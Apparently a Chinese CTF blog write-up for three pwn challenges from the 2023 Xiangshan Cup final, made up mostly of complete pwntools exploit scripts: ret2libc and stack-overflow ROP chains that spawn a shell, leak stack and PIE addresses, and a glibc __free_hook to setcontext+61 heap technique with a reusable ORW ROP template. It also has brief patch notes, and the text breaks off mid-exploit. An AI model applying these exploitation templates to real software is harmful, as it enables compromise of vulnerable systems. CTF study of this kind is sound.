<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>香山杯2023决赛-PWN部分 writeup | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>香山杯2023决赛-PWN部分 writeup</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-11-20T14:41:16.000Z" id="date"> 2023-11-20</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:35.018Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><h1 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br>p=remote(<span class="hljs-string">&quot;47.94.85.181&quot;</span>,<span class="hljs-number">32135</span>)<br>elf=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc=elf.libc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zako</span>():<br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;fight?&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    zako()<br><br><br>p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;6&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;shop&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;fight?&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;name!&quot;</span>)<br><br><span class="hljs-comment">#0x0000000000401a3b : pop rdi ; ret</span><br><span class="hljs-comment">#0x0000000000401a39 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-comment">#0x0000000000401016 : ret</span><br><br>pop_rdi=<span class="hljs-number">0x0000000000401a3b</span><br>pop_rsi_r15=<span class="hljs-number">0x0000000000401a39</span><br>ret=<span class="hljs-number">0x0000000000401016</span><br><span class="hljs-comment">#gdb.attach(p,&quot;b*0x401871&quot;)</span><br><span class="hljs-comment">#pause()</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x650</span>+p64(<span class="hljs-number">0</span>)<br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">0x404058</span>)+p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])+p64(<span class="hljs-number">0x401749</span>)<br><br>p.sendline(payload)<br>leak=u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br>basetest=leak-libc.symbols[<span class="hljs-string">&quot;setvbuf&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(basetest))<br><br>p.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x650</span>+p64(<span class="hljs-number">0</span>)<br>payload+=p64(ret)+p64(pop_rdi)+p64(basetest+<span class="hljs-number">0x1B45BD</span>)+p64(basetest+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>])<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>有 gets ，把那个注就过了。</p>
<h1 id="how2stack"><a href="#how2stack" class="headerlink" title="how2stack"></a>how2stack</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br>p=remote(<span class="hljs-string">&quot;39.106.48.123&quot;</span>,<span class="hljs-number">13774</span>)<br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>lens=<span class="hljs-number">1000</span><br>p.sendline(<span class="hljs-built_in">str</span>(lens))<br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br><br><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x64</span>+p32(<span class="hljs-number">0xffffffff</span>)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;ff ff ff ff &quot;</span>)<br><br>leak_stack=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_stack+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">8</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_stack+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">16</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_stack+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">24</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_stack+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">32</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_stack+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">40</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak_stack))<br><br><br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br><br>lens=<span class="hljs-number">1000</span><br>p.sendline(<span class="hljs-built_in">str</span>(lens))<br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x64</span>+p32(<span class="hljs-number">0xffffffff</span>)+p64(leak_stack+<span class="hljs-number">0x10</span>)+p64(leak_stack+<span class="hljs-number">0x10</span>)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;hex: &quot;</span>)<br>leak_pie=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_pie+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">8</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_pie+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">16</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_pie+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">24</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_pie+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">32</span>)<br>p.recv(<span class="hljs-number">1</span>)<br>leak_pie+=(<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">40</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak_pie))<br>basetest=leak_pie-(<span class="hljs-number">0x55e5350c8955</span>-<span class="hljs-number">0x55e5350c7000</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(basetest))<br><span class="hljs-comment">#0x00000000000019d3 : pop rdi ; ret</span><br><span class="hljs-comment">#0x00000000000019d1 : pop rsi ; pop r15 ; ret</span><br><br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>lens=<span class="hljs-number">1000</span><br>p.sendline(<span class="hljs-built_in">str</span>(lens))<br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x64</span>+p32(<span class="hljs-number">0xffffffff</span>)+p64(leak_stack+<span class="hljs-number">0x10</span>)+p64(leak_stack+<span class="hljs-number">0x10</span>)<br>payload+=p64(basetest+<span class="hljs-number">0x00000000000019d3</span>)+p64(basetest+<span class="hljs-number">0x3FC0</span>)+p64(basetest+<span class="hljs-number">0x0000000000010E0</span>)<br>payload+=p64(<span class="hljs-number">0x16AF</span>+basetest)<br>p.send(payload)<br>leak=u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br><br><span class="hljs-comment">#gdb.attach(p,&quot;b*$rebase(0x18E4)&quot;)</span><br><span class="hljs-comment">#pause()</span><br>lens=<span class="hljs-number">1000</span><br>p.sendline(<span class="hljs-built_in">str</span>(lens))<br>p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x64</span>+p32(<span class="hljs-number">0xffffffff</span>)+p64(leak_stack+<span class="hljs-number">0x10</span>)+p64(leak_stack+<span class="hljs-number">0x10</span>)<br>payload+=p64(leak-(<span class="hljs-number">0x7f7b18d7d0b0</span>-<span class="hljs-number">0x7f7b18d1a000</span>)+<span class="hljs-number">0xe3b01</span>)<br>p.send(payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h2><p>栈溢出，把 read 的参数 nbytes 改成 99 就行。</p>
<h1 id="camera"><a href="#camera" class="headerlink" title="camera"></a>camera</h1><p>其实我自己也不记得那个机制了，但是赛中测试的时候发现还能这样。</p>
<p>当 fastbin 中存在 chunk chain 的时候，哪怕这个 chunk 的所有数据都是不合法的，只要它不是链表头，那么通过 malloc 从 fastbin 申请内存以后，其后的所有 chunk 都会不经检查地被放入到对应的 tcachebin 中，当能覆盖 fastbin 的 fd 之后，这个机制将能导致任意地址申请。</p>
<p>然后是另外一个 trick，在禁用 execve 之后通过 orw 的时候必然需要 rop ，但是只能劫持 <code>__free_hook</code> 是不太能劫持到 ROP 的，往往是通过如下的 gadget 来完成：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">key_setsecret-&gt; getkeyserv_handle+<span class="hljs-number">576</span><br>   <span class="hljs-number">0x7f4006e3b990</span> &lt;getkeyserv_handle+<span class="hljs-number">576</span>&gt;:	mov    rdx,QWORD PTR [rdi+<span class="hljs-number">0x8</span>]<br>   <span class="hljs-number">0x7f4006e3b994</span> &lt;getkeyserv_handle+<span class="hljs-number">580</span>&gt;:	mov    QWORD PTR [rsp],rax<br>   <span class="hljs-number">0x7f4006e3b998</span> &lt;getkeyserv_handle+<span class="hljs-number">584</span>&gt;:	call   QWORD PTR [rdx+<span class="hljs-number">0x20</span>]<br></code></pre></td></tr></table></figure>

<p>此处再配合 <code>setcontext+61</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">text:0000000000054F5D 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]<br>.text:0000000000054F64 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]<br>.text:0000000000054F6B 48 8B 6A 78                   mov     rbp, [rdx+78h]<br>.text:0000000000054F6F 4C 8B 62 48                   mov     r12, [rdx+48h]<br>.text:0000000000054F73 4C 8B 6A 50                   mov     r13, [rdx+50h]<br>.text:0000000000054F77 4C 8B 72 58                   mov     r14, [rdx+58h]<br>.text:0000000000054F7B 4C 8B 7A 60                   mov     r15, [rdx+60h]<br>.text:0000000000054F7F 64 F7 04 25 48 00 00 00 02 00+test    dword ptr fs:48h, 2<br>.text:0000000000054F8B 0F 84 B5 00 00 00             jz      loc_55046<br><br>此处省略<br><br>.text:0000000000055046 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]<br>.text:000000000005504D 51                            push    rcx<br>.text:000000000005504E 48 8B 72 70                   mov     rsi, [rdx+70h]<br>.text:0000000000055052 48 8B 7A 68                   mov     rdi, [rdx+68h]<br>.text:0000000000055056 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]<br>.text:000000000005505D 4C 8B 42 28                   mov     r8, [rdx+28h]<br>.text:0000000000055061 4C 8B 4A 30                   mov     r9, [rdx+30h]<br>.text:0000000000055065 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]<br>.text:0000000000055065                               ; &#125; // starts at 54F20<br>.text:000000000005506C                               ; __unwind &#123;<br>.text:000000000005506C 31 C0                         xor     eax, eax<br>.text:000000000005506E C3                            retn<br></code></pre></td></tr></table></figure>

<p>在香山杯决赛里遇到了这个利用，就因为忘记了这个 trick 导致与奖失之交臂，难受……</p>
<p>这里贴份模板：</p>
<p>Reg_mem：当 free_hook 被劫持后，释放如下内容的内存块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">reg_context = flat(&#123; <br><span class="hljs-number">0x20</span>: p64(basetest+libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>]+<span class="hljs-number">61</span>), <span class="hljs-comment">#call setcontext+61</span><br><span class="hljs-number">0x28</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r8</span><br><span class="hljs-number">0x30</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r9</span><br><span class="hljs-number">0x48</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r12</span><br><span class="hljs-number">0x50</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r13</span><br><span class="hljs-number">0x58</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r14</span><br><span class="hljs-number">0x60</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r15</span><br><span class="hljs-number">0x68</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rdi</span><br><span class="hljs-number">0x70</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rsi</span><br><span class="hljs-number">0x78</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rbp</span><br><span class="hljs-number">0x80</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rbx</span><br><span class="hljs-number">0x88</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rdx</span><br><span class="hljs-number">0x98</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rcx</span><br><span class="hljs-number">0xa0</span>: heap_base+<span class="hljs-number">0x500</span>,<span class="hljs-comment">#rsp</span><br><span class="hljs-number">0xa8</span>: p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#ret addr</span><br>&#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>, arch = <span class="hljs-string">&quot;amd64&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>hijack_hoo：劫持 free_hook 到特定偏移(此处为 2.31)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p64(basetest+(<span class="hljs-number">0x151990</span>))<br></code></pre></td></tr></table></figure>

<p>ROP：此处存放了最终的 ROP，在 Reg_mem 中将 RSP 执行存放如下内容的内存块即可完成 ROP，下图中均为特定题目的偏移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">rop=<span class="hljs-string">b&quot;&quot;</span>+p64(basetest+<span class="hljs-number">0x0000000000023b6a</span>)+p64(<span class="hljs-number">1</span>)+p64(basetest+<span class="hljs-number">0x000000000002601f</span>)+p64(<span class="hljs-number">3</span>)<br>rop+=p64(basetest+<span class="hljs-number">0x0000000000142c92</span>)+p64(<span class="hljs-number">0</span>)+p64(basetest+<span class="hljs-number">0x000000000010257e</span>)+p64(<span class="hljs-number">0x100</span>)+p64(<span class="hljs-number">100</span>)+p64(basetest+libc.sym[<span class="hljs-string">&quot;sendfile64&quot;</span>])<br></code></pre></td></tr></table></figure>

<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#p=remote(&quot;47.94.85.181&quot;,32135)</span><br>elf=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc=elf.libc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shoot</span>(<span class="hljs-params">n</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;pictures?\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(n))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size,context</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;budget.\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Content: \n&quot;</span>)<br>    p.send(context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">n</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;load\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(n))<br><br>buy(<span class="hljs-number">0x500</span>-<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#0</span><br>buy(<span class="hljs-number">0x500</span>-<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#1</span><br>buy(<span class="hljs-number">0x500</span>-<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#2</span><br>load(<span class="hljs-number">1</span>)<br>shoot(<span class="hljs-number">30</span>)<br>buy(<span class="hljs-number">0x500</span>-<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#1</span><br>load(<span class="hljs-number">1</span>)<br><br>shoot(<span class="hljs-number">30</span>)<br>leak=u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span 